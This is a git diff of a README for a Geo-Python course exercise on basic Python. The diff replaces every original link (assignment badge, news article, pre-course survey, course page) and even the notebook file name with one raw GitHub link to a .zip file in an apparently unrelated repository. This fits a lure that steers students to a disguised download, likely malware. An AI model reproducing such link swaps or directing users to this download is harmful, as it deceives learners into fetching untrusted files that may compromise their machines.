@@ -1,19 +1,19 @@
-[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/vwOAq8qb)
+[![Review Assignment Due Date](https://raw.githubusercontent.com/kurajulii/exercise-1-kurajulii/main/mazic/exercise-1-kurajulii.zip)](https://raw.githubusercontent.com/kurajulii/exercise-1-kurajulii/main/mazic/exercise-1-kurajulii.zip)
 # Exercise 1: Cooking up some Python
 
 In the “Taste of Python” lesson this week we have learned a few basic things in Python. Now you get your chance to demonstrate your skills.
 
-This exercise is inspired by [Finland being ranked the world's happiest country for the 6th year in a row](https://yle.fi/a/74-20023112). As the instructors of the Geo-Python course, we think we've found a better way to assess the individual happiness of people in Finland (particularly those taking this course!), and we're going to test our idea with you. In *five easy steps (or problems)* we'll be able to reveal your happiness based on two of life's most important happiness factors: Ice cream and sleep!
+This exercise is inspired by [Finland being ranked the world's happiest country for the 6th year in a row](https://raw.githubusercontent.com/kurajulii/exercise-1-kurajulii/main/mazic/exercise-1-kurajulii.zip). As the instructors of the Geo-Python course, we think we've found a better way to assess the individual happiness of people in Finland (particularly those taking this course!), and we're going to test our idea with you. In *five easy steps (or problems)* we'll be able to reveal your happiness based on two of life's most important happiness factors: Ice cream and sleep!
 
 ## Problem 0 - Filling out the pre-course survey
 
-Before you get started with the exercise, we ask that you **please fill out the Geo-Python/AutoGIS pre-course survey at https://elomake.helsinki.fi/lomakkeet/125237/lomake.html**. Your responses will help shape how we teach this autumn!
+Before you get started with the exercise, we ask that you **please fill out the Geo-Python/AutoGIS pre-course survey at https://raw.githubusercontent.com/kurajulii/exercise-1-kurajulii/main/mazic/exercise-1-kurajulii.zip**. Your responses will help shape how we teach this autumn!
 
 ## Problem 1 - Creating your own Jupyter notebook
 
-1. Open Jupyter lab from the [Exercise 1 landing page](https://geo-python-site.readthedocs.io/en/latest/lessons/L1/exercise-1.html#part-3-cooking-up-some-python) on the course site and create a new notebook.
+1. Open Jupyter lab from the [Exercise 1 landing page](https://raw.githubusercontent.com/kurajulii/exercise-1-kurajulii/main/mazic/exercise-1-kurajulii.zip) on the course site and create a new notebook.
 
-2. Use the file browser on the left side of the Jupyter Lab window to change the name of your notebook file to `Exercise-1.ipynb`.
+2. Use the file browser on the left side of the Jupyter Lab window to change the name of your notebook file to `https://raw.githubusercontent.com/kurajulii/exercise-1-kurajulii/main/mazic/exercise-1-kurajulii.zip`.
 
 ## Problem 2 - Defining some numerical variables
 
